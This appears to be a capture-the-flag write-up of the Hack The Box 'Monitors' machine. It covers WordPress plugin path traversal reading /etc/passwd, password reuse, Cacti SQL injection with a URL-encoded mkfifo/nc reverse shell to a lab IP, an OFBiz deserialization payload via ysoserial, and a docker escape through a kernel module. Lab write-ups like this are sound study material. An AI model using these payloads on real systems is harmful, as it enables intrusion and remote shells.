### writeups
* https://0xdf.gitlab.io/2021/10/09/htb-monitors.html

### wpscan then searchsploit the plugin version
```url
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
```

View Page Source would make readability better.

There’s not a ton I can do with the second remote include, as PHP is calling `file_get_contents`, so even if I pass in PHP code, it won’t be executed. If this were a Windows server, I could try to get something over SMB and collect the NetNTLMv2 challenge.

### Enum
With access to the file system, I’ll look at various files that might contain useful information. I tried to get `/var/www/html/wp-config.php` to get the DB password and username, but nothing came back. That could be the wrong directory.

To find where on the file system the websites are rooted, I’ll look into the Apache sites-enabled. The default is `/etc/apache2/sites-enabled/000-default.conf`, and that works: https://www.thegeekdiary.com/how-to-configure-apache-virtual-host-on-ubuntu/

```url
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
url=/../../../../etc/apache2/sites-enabled/000-default.conf

http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
url=/../../../../etc/apache2/sites-enabled/monitors.htb.conf


    Re-check for wordpress configs in /var/www/wordpress
    Enumerate cacti-admin.monitors.htb


http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
url=/../../../../var/www/wordpress/wp-config.php
```

Attempting to authenticate to the WordPress login fails with both `wpadmin:BestAdministrator@2020!` and `admin:BestAdministrator@2020!`. Going back to the virtual host configuration files we notice the `cacti-admin.monitors.htb` subdomain.

Password reuse here, `BestAdministrator@2020!` login as admin.

### Enum Cacti after login
```bash
searchsploit Cacti

searchsploit -m php/webapps/49810.py
```

or google `Cacti 1.2.12 CVE` to get it 
* https://github.com/advisories/GHSA-rwpv-9gq4-x5g3
* https://github.com/Cacti/cacti/issues/3622
* https://packetstormsecurity.com/files/162384/Cacti-1.2.12-SQL-Injection-Remote-Code-Execution.html

### Manual
```txt url
http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;--+-

http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='ping+-c+3+10.10.16.5;'+where+name='path_php_binary';--+-
```

When visiting `/cacti/host.php?action=reindex` we notice that our payload is not being triggered but `tcpdump` is getting hit with three more ICMP requests, there seems to be some on site caching taking place so we log out, log back in, replace the cookie in BurpSuite with our new cookie, fire the payload again then visit `/cacti/host.php?action=reindex`.

The hardest part of getting a shell for me was learning a quirk about the RCE and how the `host.php` trigger worked. I was set up with the request to do the SQL injection in one Burp Repeater window, and the trigger via host.php in another. I noticed that even after I changed the payload, I was still getting pings. It seems that no matter what the DB says, the actually binary will would only update once per session. So once I visited `host.php` to trigger, if I wanted to trigger again, I needed to log out and back in, and then it would work.

Tricky thing here is that people might even use the wrong payload at the first try. It'll make it even harder to realize how `host.php` works once per session/cookie.

```txt url
http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.5%20443%20%3E%2Ftmp%2Ff;'+where+name='path_php_binary';--+-
```

It worked as same as the searchploit python script.

### Lateral to Marcus
```bash
www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup.service 
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```

```bash
www-data@monitors:/home/marcus$ su marcus -
Password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
marcus@monitors:~$ cat user.txt 
b9d0a72edc1b
```

### Privilege Escalation to Root 
```bash
marcus@monitors:~$ cat note.txt 
TODO:

Disable phpinfo in php.ini              - DONE
Update docker image for production use  - 

marcus@monitors:~$ netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN

ps -aux
root       2145  0.0  0.1 554520  4080 ?        Sl   00:53   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443
```

`-k, --no-tls-validation`               Skip TLS certificate verification

```bash
❯ feroxbuster -u https://127.0.0.1:8443 -k --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --depth 1 -t 50    
```

### Apache OFBiz XML-RPC Java Deserialization (CVE-2020-9496) to get root in docker container
* https://packetstormsecurity.com/files/161769/Apache-OFBiz-XML-RPC-Java-Deserialization.html
* https://github.com/A1vinSmith/vulhub/tree/master/ofbiz/CVE-2020-9496

The biggest issue is fixing the Java version.

```bash
❯ java -jar ysoserial-all.jar CommonsBeanutils1 'wget 10.10.14.7' | base64 -w 0
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Error while generating or serializing payload
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x4015e7ec) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x4015e7ec
        at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
        at ysoserial.payloads.CommonsBeanutils1.getObject(CommonsBeanutils1.java:20)
        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
❯ java --version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk 17.0.6 2023-01-17
OpenJDK Runtime Environment (build 17.0.6+10-Debian-1)
OpenJDK 64-Bit Server VM (build 17.0.6+10-Debian-1, mixed mode, sharing)
❯ update-java-alternatives --list
java-1.11.0-openjdk-amd64      1111       /usr/lib/jvm/java-1.11.0-openjdk-amd64
java-1.17.0-openjdk-amd64      1711       /usr/lib/jvm/java-1.17.0-openjdk-amd64
❯ sudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64
```

### Docker Escape via CAP_SYS_MODULE
* https://unix.stackexchange.com/questions/125757/make-complains-missing-separator-did-you-mean-tab
* https://stackoverflow.com/questions/16931770/makefile4-missing-separator-stop

sublime has bug for using `tab`. Try other text editors instead.

```bash
❯ cat -e -t -v Makefile
obj-m +=reverse-shell.o$
all:$
^Imake -C /lib/modules/4.15.0-151-generic/build M=$(pwd) modules$
clean:$
^Imake -C /lib/modules/4.15.0-151-generic/build M=$(pwd) clean$
```

Also ther is no error of `scripts/basic/fixdep` anymore that offical writeup addressed.

### Cleanup
Don't forget to reset JAVA version